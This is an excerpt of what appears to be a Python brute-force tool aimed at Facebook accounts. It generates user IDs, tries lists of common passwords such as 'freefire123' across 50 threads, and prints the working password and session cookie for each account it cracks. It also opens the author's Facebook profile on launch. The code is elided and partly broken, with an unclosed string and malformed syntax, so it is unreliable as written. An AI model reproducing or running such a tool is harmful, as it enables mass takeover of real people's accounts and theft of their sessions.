# Facebook: MD ABDULLA HASAN RAJU 
# Github: MD ABDULLA HASAN RAJU
...
ha = current.day
today = date.today()
os.system('xdg-open https://facebook.com/100089255987022)
logo =( ▄▀█ █▄▄ █▀▄ █░█ █░░ █░░ ▄▀█
 █▀█ █▄█ █▄▀ █▄█ █▄▄ █▄▄ █▀█) 
loop = 0
oks = []
...
def xxr():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        jalan('\033[1;97m====================================================')
        for love in user:
            pwx = [uid,'i love free fire','freefire','freefire123','freefire321','freefire@123','freefire@321','free fire','free fire123','free fire@123','free fire321',' free fire@321','free fire123','i love you']
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[RAJU-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
